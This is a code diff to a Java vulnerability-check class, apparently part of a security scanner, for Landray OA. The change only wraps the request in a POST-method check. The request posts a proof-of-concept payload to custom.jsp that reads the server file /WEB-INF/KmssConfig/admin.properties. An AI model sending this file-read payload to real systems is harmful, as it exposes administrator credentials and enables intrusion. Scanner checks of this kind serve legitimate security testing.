@@ -20,12 +20,13 @@ public class LandrayOa extends VulTaskImpl {
 
     @Override
     public VulResult run() {
-        //新的请求包
-        String url = iHttpService.getProtocol() +"://"+ iHttpService.getHost() + ":" + iHttpService.getPort() + "/sys/ui/extend/varkind/custom.jsp";
-        String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
-        //新请求
-        okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new LandrayOaCallback(this));
-
+        if (method.equalsIgnoreCase("post")) {
+            //新的请求包
+            url = iHttpService.getProtocol() + "://" + iHttpService.getHost() + ":" + iHttpService.getPort() + "/sys/ui/extend/varkind/custom.jsp";
+            String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
+            //新请求
+            okHttpRequester.send(url, method, request_header_list, query, poc_body, contentYtpe, new LandrayOaCallback(this));
+        }
         return result;
     }
 }
